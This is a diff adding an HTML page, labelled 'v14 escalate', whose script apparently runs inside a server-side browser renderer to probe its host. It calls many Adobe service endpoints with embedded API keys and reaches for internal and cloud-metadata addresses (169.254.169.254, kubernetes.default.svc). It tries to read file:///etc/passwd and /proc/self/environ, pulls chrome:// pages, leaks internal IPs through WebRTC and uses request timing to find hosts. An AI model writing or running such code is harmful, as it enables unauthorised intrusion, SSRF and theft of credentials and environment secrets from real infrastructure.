@@ -1,0 +1,137 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>v14</title></head>
+<body><pre id="r"></pre>
+<script>
+var R=document.getElementById('r');
+function L(s){try{R.textContent+=String(s)+'\n';}catch(e){}}
+function T(ms){var t=Date.now();while(Date.now()-t<ms){}}
+
+L('=== v14 escalate '+new Date().toISOString()+' ===');
+L('UA: '+navigator.userAgent);
+L('cores/mem: '+navigator.hardwareConcurrency+'/'+navigator.deviceMemory);
+
+// Helper: fetch with timeout + headers summary
+function F(url, opts, tag){
+  opts=opts||{};
+  var ctrl=new AbortController();
+  setTimeout(function(){try{ctrl.abort();}catch(e){}}, 4000);
+  opts.signal=ctrl.signal;
+  opts.mode=opts.mode||'cors';
+  return fetch(url, opts).then(function(r){
+    return r.text().then(function(t){
+      var hs='';
+      try{ r.headers.forEach(function(v,k){ if(/request-id|server|x-|www-auth|content-type|allow/i.test(k)) hs+=k+':'+v+';'; }); }catch(e){}
+      L(tag+' '+r.status+' h=['+hs+'] body='+t.substring(0,280).replace(/\n/g,' '));
+    });
+  }).catch(function(e){ L(tag+' ERR '+e.message); });
+}
+
+var jobs=[];
+
+// 1) Unauthenticated/public Adobe HTTPS endpoints that may leak data
+var unauth=[
+  ['disc-index','https://dcdiscovery.adobe.io/index'],
+  ['disc-index-key','https://dcdiscovery.adobe.io/index',{headers:{'x-api-key':'dc-prod-virgoweb','Accept':'application/json'}}],
+  ['disc-v1','https://dcdiscovery.adobe.io/1785845424/index',{headers:{'x-api-key':'dc-prod-virgoweb','Accept':'application/json'}}],
+  ['edge-root','https://platform-cs-edge-va6.adobe.io/'],
+  ['edge-root-key','https://platform-cs-edge-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['edge-jpn3','https://platform-cs-edge-jpn3.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['edge-health','https://platform-cs-edge-va6.adobe.io/health',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['edge-health2','https://platform-cs-edge-va6.adobe.io/healthz'],
+  ['edge-status','https://platform-cs-edge-va6.adobe.io/status'],
+  ['cs-health','https://platform-cs-va6.adobe.io/health'],
+  ['cs-root','https://platform-cs-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['storage','https://cc-api-storage.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['storage-regions','https://cc-api-storage.adobe.io/regions',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['ims-check','https://ims-na1.adobelogin.com/ims/check/v6/token'],
+  ['ims-validate','https://ims-na1.adobelogin.com/ims/validate_token/v1'],
+  ['sensei','https://senseicore-ue1.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['sensei-health','https://senseicore-ue1.adobe.io/health'],
+  ['argus','https://dc-argus.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['notify','https://notify.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['comments','https://comments.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['invitations','https://invitations.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['inv-health','https://invitations.adobe.io/health'],
+  ['kwc-api','https://dc-kwcollection-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['kwc-health','https://dc-kwcollection-va6.adobe.io/health'],
+  ['conv-hist','https://dc-conversationhistory-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['genai-plat','https://dc-genai-content-platform-v2-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+  ['genai-prov','https://dc-genai-access-provisioning-api.adobe.io/users/ai/limits',{headers:{'x-api-key':'dc-prod-virgoweb','Accept':'application/vnd.adobe.dc+json; profile="https://dc-genai-access-provisioning-api.adobe.io/schemas/limits_v2.json"'}}],
+  ['firefly','https://firefly-clio-imaging.adobe.io/',{headers:{'x-api-key':'projectx_webapp'}}],
+  ['adobeio-runtime','https://adobeioruntime.net/api/v1/web/'],
+];
+
+unauth.forEach(function(item){
+  jobs.push(F(item[1], item[2]||{}, item[0]));
+});
+
+// 2) Internal-looking hostnames over HTTPS (service mesh style)
+var internalHosts=[
+  'https://localhost/',
+  'https://127.0.0.1/',
+  'https://[::1]/',
+  'https://metadata.google.internal/',
+  'https://kubernetes.default.svc/',
+  'https://kubernetes.default.svc.cluster.local/',
+];
+internalHosts.forEach(function(u,i){ jobs.push(F(u,{},'int'+i)); });
+
+// 3) file:// probes
+['file:///etc/passwd','file:///proc/self/environ','file:///proc/self/cwd','file:///',
+ 'file:///etc/hosts','file:///proc/net/tcp'].forEach(function(u){
+  jobs.push(F(u,{mode:'no-cors'},'file-nc-'+u.slice(0,20)).catch(function(){}));
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET',u,true);
+    x.onload=function(){L('xhr-file '+u+' '+x.status+' '+String(x.responseText).substring(0,120));};
+    x.onerror=function(){L('xhr-file '+u+' ERR');};
+    x.send();
+  }catch(e){L('xhr-file '+u+' EX '+e.message);}
+});
+
+// 4) chrome:// pages
+['chrome://version/','chrome://gpu/','chrome://net-internals/','chrome://credits/'].forEach(function(u){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET',u,true);
+    x.onload=function(){L('chrome '+u+' '+x.status+' '+String(x.responseText).substring(0,100));};
+    x.onerror=function(){L('chrome '+u+' ERR');};
+    x.send();
+  }catch(e){L('chrome '+u+' EX '+e.message);}
+});
+
+// 5) Attempt CORS POST discovery / token-ish endpoints without Authorization
+jobs.push(F('https://dcdiscovery.adobe.io/index',{
+  method:'POST', mode:'cors',
+  headers:{'x-api-key':'dc-prod-virgoweb','Content-Type':'application/json','Accept':'application/json'},
+  body:'{}'
+},'disc-post'));
+
+// 6) Try to read edge with various public-looking paths
+['/index','/v1','/v2','/api','/api/v1','/discovery','/openapi','/swagger','/metrics','/.well-known/openid-configuration'].forEach(function(p){
+  jobs.push(F('https://platform-cs-edge-va6.adobe.io'+p,{headers:{'x-api-key':'dc-prod-virgoweb'}},'edge'+p));
+});
+
+// 7) WebRTC more detail
+try{
+  var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+  pc.createDataChannel('x');
+  pc.onicecandidate=function(e){ if(e.candidate) L('ICE '+e.candidate.candidate); };
+  pc.createOffer().then(function(o){ pc.setLocalDescription(o); L('SDP '+(o.sdp||'').split('\n').filter(function(l){return /IP|candidate|a=/.test(l);}).slice(0,12).join('|')); });
+}catch(e){L('webrtc EX '+e.message);}
+
+// 8) DNS timing side channel for a few hosts (existence)
+function timeDns(host){
+  var t0=performance.now();
+  return fetch('https://'+host+'/',{mode:'no-cors',cache:'no-store'}).then(function(){
+    L('time '+host+' '+(performance.now()-t0).toFixed(1)+'ms ok');
+  }).catch(function(){
+    L('time '+host+' '+(performance.now()-t0).toFixed(1)+'ms fail');
+  });
+}
+['platform-cs-edge-va6.adobe.io','does-not-exist-xyz.adobe.io','169.254.169.254','10.0.0.1'].forEach(function(h){ jobs.push(timeDns(h)); });
+
+// Keep alive for async
+T(14000);
+Promise.allSettled(jobs).then(function(){ L('=== ALL SETTLED ==='); T(500); });
+T(2000);
+</script></body></html>
